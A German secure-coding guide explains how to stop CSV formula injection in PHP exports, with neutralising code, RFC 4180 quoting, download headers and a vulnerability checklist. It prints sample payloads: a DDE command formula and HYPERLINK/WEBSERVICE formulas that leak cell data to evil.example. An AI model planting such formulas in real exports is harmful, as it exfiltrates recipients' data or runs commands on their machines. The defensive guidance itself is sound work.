# How-to: CSV-/Tabellenkalkulations-Formel-Injection beim Export verhindern

Wenn Ihre API benutzergelieferte Daten als CSV exportiert, liegt die Gefahr nicht auf Ihrem Server — sie liegt in der **Tabellenkalkulation des Empfängers**. Excel, Google Sheets und LibreOffice behandeln eine Zelle, deren Text mit `=`, `+`, `-`, `@`, einem Tabulator (`\t`) oder einem Wagenrücklauf (`\r`) beginnt, als **Formel**. Ein Angreifer, der eine Zeichenkette wie `=cmd|'/c calc'!A0` oder `=HYPERLINK("https://evil.example/?"&A1)` in Ihre Datenbank bekommt, sorgt dafür, dass sie ausgeführt (DDE) oder die Zeile exfiltriert wird, wenn ein Administrator die exportierte Datei öffnet.

Dies ist **CSV-Injection** (auch Formel-Injection genannt). Es ist ein *Ausgabe-Kodierungs*-Problem an der Exportgrenze — verschieden von [SQL-Injection](sql-injection.md) (ein Abfrageproblem) und von [CSV-Massenimport](csv-bulk-import.md) (ein Eingabeproblem).

**Voraussetzung**: Sie haben einen Endpunkt, der Zeilen als CSV zurückgibt.

---

## 1. Der Angriff

Speichern Sie dies als völlig gültigen „Anzeigenamen", exportieren Sie dann die Tabelle als CSV und öffnen Sie sie in Excel:

```
=HYPERLINK("https://evil.example/leak?d="&A1&A2, "Click for refund")
```

- `=...HYPERLINK...` — exfiltriert benachbarte Zellen zu einer Angreifer-URL beim Anklicken.
- `=WEBSERVICE("https://evil.example/?"&A1)` — exfiltriert **ohne Klick** in älterem Excel.
- `=cmd|'/c calc'!A0` — DDE; kann nach einem Bestätigungsdialog einen lokalen Befehl ausführen.

Nichts davon berührt Ihren Server. Ihre Validierung war erfolgreich, Ihr SQL war parametrisiert — und dennoch haben Sie einen funktionierenden Exploit innerhalb einer „gültigen" CSV ausgeliefert.

---

## 2. Die Lösung: das führende Zeichen neutralisieren

Die von OWASP empfohlene Baseline: Wenn ein Zellenwert mit einem gefährlichen Zeichen beginnt **und keine reine Zahl ist**, stellen Sie ihm ein einzelnes Anführungszeichen (`'`) voran. Excel rendert die Zelle dann als wörtlichen Text.

```php
/**
 * Neutralize a value before writing it to a CSV cell so spreadsheet
 * software cannot interpret it as a formula.
 */
function neutralizeCsvCell(string $value): string
{
    if ($value === '') {
        return $value;
    }
    $dangerous = ['=', '+', '-', '@', "\t", "\r"];
    // Keep genuine numbers (incl. negatives like -50) intact; only quote
    // values that *start* dangerous and are not numeric.
    if (in_array($value[0], $dangerous, true) && !is_numeric($value)) {
        return "'" . $value;
    }

    return $value;
}
```

Der `!is_numeric()`-Schutz ist der Teil, den die meisten Implementierungen falsch machen: Das blinde Voranstellen vor jedem `-`/`+` verwandelt die legitime Zahl `-50` in den Text `'-50` und zerstört Summen in der Tabelle des Empfängers. Zahlen passieren unverändert; nur formelförmige Zeichenketten werden in Anführungszeichen gesetzt.

---

## 3. Mit RFC-4180-Quoting kombinieren

Die Neutralisierung kümmert sich um Formeln; Sie benötigen weiterhin korrektes Quoting, damit Werte, die Kommas, Anführungszeichen oder Zeilenumbrüche enthalten, die Spaltenstruktur nicht zerstören (ein separater Injection-Vektor). Lassen Sie `fputcsv` das erledigen, mit `escape=""` für striktes [RFC 4180](https://www.rfc-editor.org/rfc/rfc4180)-Verhalten (kein Backslash-Escaping):

```php
$fp = fopen('php://temp', 'r+');
foreach ($rows as $row) {
    fputcsv($fp, array_map('neutralizeCsvCell', $row), ',', '"', '');
}
rewind($fp);
$csv = stream_get_contents($fp);
```

Eingabe → Ausgabe (verifiziert):

```
=1+1                       → '=1+1
+budget                    → '+budget
@home                      → '@home
-50                        → -50            (real number, untouched)
=cmd|'/c calc'!A0          → "'=cmd|'/c calc'!A0"
a,b                        → "a,b"
he said "hi"               → "he said ""hi"""
```

> `escape=""` ist wichtig: PHPs historisches Standard-Escape-Zeichen (`\`) erzeugt eine Ausgabe, die **nicht** RFC 4180 entspricht und die Excel falsch parst. Immer `""` übergeben.

---

## 4. Als Download-Antwort zurückgeben

Bauen Sie die PSR-7-Antwort im Handler. Zwei weitere Header-Detail-Aspekte sind wichtig:

```php
$filename = 'export-' . date('Ymd') . '.csv';

return $responseFactory->createResponse(200)
    ->withHeader('Content-Type', 'text/csv; charset=UTF-8')
    // Sanitize the filename: strip CR/LF/quotes so it cannot inject extra headers.
    ->withHeader('Content-Disposition', 'attachment; filename="'
        . preg_replace('/[\r\n"]/', '', $filename) . '"')
    ->withBody($streamFactory->createStream("\u{FEFF}" . $csv));
```

- **`Content-Disposition: attachment`** erzwingt einen Download, anstatt den Browser die Bytes rendern zu lassen (verteidigt gegen Content-Sniffing).
- **`filename`-Sanitisierung** — interpolieren Sie niemals einen benutzergesteuerten Namen, ohne `\r`, `\n` und `"` zu entfernen; andernfalls wird er zu einem Header-Injection-Vektor.
- **BOM (`\u{FEFF}`)** — optional; sorgt dafür, dass Excel UTF-8 korrekt öffnet. Es hat keinen Einfluss auf die Injection-Abwehr.

Halten Sie die Neutralisierung in der Exportschicht (ein kleines `CsvWriter`-Value-Object), nicht verstreut über die Handler — dieselbe Garantie deckt dann jeden Export-Endpunkt ab.

---

## Schwachstellenbewertung

### V-01 — Formel-Injection via führendem `=` ✅ SICHER

**Risiko**: Ein gespeicherter Wert wie `=1+1` oder `=HYPERLINK(...)` wird ausgeführt, wenn die CSV geöffnet wird.
**Befund**: SICHER — `neutralizeCsvCell()` stellt `'` voran, sodass die Zelle als Text gerendert wird (`'=1+1`).

---

### V-02 — DDE-Befehlsausführung (`=cmd|...`) ✅ SICHER

**Risiko**: `=cmd|'/c calc'!A0` löst DDE aus und kann einen lokalen Befehl ausführen.
**Befund**: SICHER — der Payload beginnt mit `=` und ist nicht numerisch, also wird er in Anführungszeichen gesetzt (`"'=cmd|'/c calc'!A0"`).

---

### V-03 — Datenexfiltration via `WEBSERVICE`/`HYPERLINK` ✅ SICHER

**Risiko**: `=WEBSERVICE("https://evil/?"&A1)` leakt benachbarte Zellen, manchmal ohne Klick.
**Befund**: SICHER — identisch neutralisiert; das führende `=` wird entschärft, bevor der Funktionsname erreicht wird.

---

### V-04 — Führende `+`, `-`, `@`-Auslöser ✅ SICHER

**Risiko**: Excel wertet auch Zellen aus, die mit `+`, `-` und `@` beginnen.
**Befund**: SICHER — alle vier sind in der `$dangerous`-Menge; `+budget` → `'+budget`, `@home` → `'@home`.

---

### V-05 — Tabulator-/Wagenrücklauf-Präfix-Umgehung ✅ SICHER

**Risiko**: Ein führendes `\t` oder `\r` wird von einigen Parsern entfernt und legt darunter ein `=` frei (`\t=1+1`).
**Befund**: SICHER — `\t` und `\r` sind selbst in der `$dangerous`-Menge, sodass die gesamte Zelle vor jeglichem Entfernen in Anführungszeichen gesetzt wird.

---

### V-06 — Spaltenumbruch via Komma / Anführungszeichen / Zeilenumbruch ✅ SICHER

**Risiko**: Ein Wert wie `a,b` oder ein eingebettetes `"`/Zeilenumbruch verschiebt Daten in die falschen Spalten (strukturelle Injection).
**Befund**: SICHER — `fputcsv(..., escape: '')` wendet RFC-4180-Quoting an (`"a,b"`, `"he said ""hi"""`).

---

### V-07 — `Content-Disposition`-Dateiname-Header-Injection ✅ SICHER

**Risiko**: Ein benutzergesteuerter Exportname, der `\r\n` enthält, schleust zusätzliche Antwort-Header ein.
**Befund**: SICHER — der Dateiname wird durch `preg_replace('/[\r\n"]/', '', ...)` geleitet, bevor er in den Header gesetzt wird.

---

### V-08 — Content-Sniffing / Inline-Rendering ✅ SICHER

**Risiko**: Ohne `attachment` kann ein Browser die CSV als HTML rendern und eingebettetes Markup ausführen.
**Befund**: SICHER — `Content-Type: text/csv` + `Content-Disposition: attachment` erzwingen einen Download.

---

### V-09 — Legitime negative Zahlen verstümmelt ✅ SICHER (Korrektheit)

**Risiko**: Übereifrige Neutralisierung verwandelt `-50` in den Text `'-50` und beschädigt nachgelagerte Summen.
**Befund**: SICHER — der `!is_numeric()`-Schutz lässt wohlgeformte Zahlen (`-50`, `+1`, `-5e3`) unverändert passieren.

---

### V-10 — Abwehrzentralisierung ✅ SICHER

**Risiko**: Pro-Handler-Ad-hoc-CSV-Erstellung lässt einen Endpunkt die Neutralisierung vergessen.
**Befund**: SICHER (by design) — die Neutralisierung lebt in einer einzigen Exportschicht, angewendet via `array_map`, sodass jede Spalte jedes Exports abgedeckt ist.

---

### VULN-Zusammenfassung

| ID | Schwachstelle | Befund |
|----|---------------|---------|
| V-01 | Formel-Injection (`=`) | ✅ SICHER |
| V-02 | DDE-Befehlsausführung | ✅ SICHER |
| V-03 | `WEBSERVICE`/`HYPERLINK`-Exfiltration | ✅ SICHER |
| V-04 | `+` / `-` / `@`-Auslöser | ✅ SICHER |
| V-05 | Tabulator- / CR-Präfix-Umgehung | ✅ SICHER |
| V-06 | Komma- / Anführungszeichen- / Zeilenumbruch-Spaltenumbruch | ✅ SICHER |
| V-07 | Dateiname-Header-Injection | ✅ SICHER |
| V-08 | Content-Sniffing / Inline-Render | ✅ SICHER |
| V-09 | Verstümmelung negativer Zahlen | ✅ SICHER |
| V-10 | Abwehrzentralisierung | ✅ SICHER |

**10 SICHER, 0 EXPONIERT.** Keine kritischen Befunde. Die Regel zum Neutralisieren des führenden Zeichens (mit einem numerischen Schutz) plus RFC-4180-Quoting und eine `attachment`-Download-Antwort schließen die CSV-Injection-Angriffsfläche. Der eine verbleibende Vorbehalt ist menschlicher Natur: Das neutralisierende `'` ist in einigen Nicht-Tabellenkalkulations-CSV-Parsern als führendes Apostroph sichtbar — akzeptabel, da die Alternative Codeausführung in der Tabellenkalkulation des Empfängers wäre.

---

## Verwandte Anleitungen

- [CSV-Massenimport](csv-bulk-import.md) — die Eingabeseite (partieller Erfolg, Duplikaterkennung)
- [Datenexport-API](data-export-api.md) — asynchroner token-geschützter Export-Ablauf
- [SQL-Injection-Abwehr](sql-injection.md) — die abfrageseitige Injection-Klasse
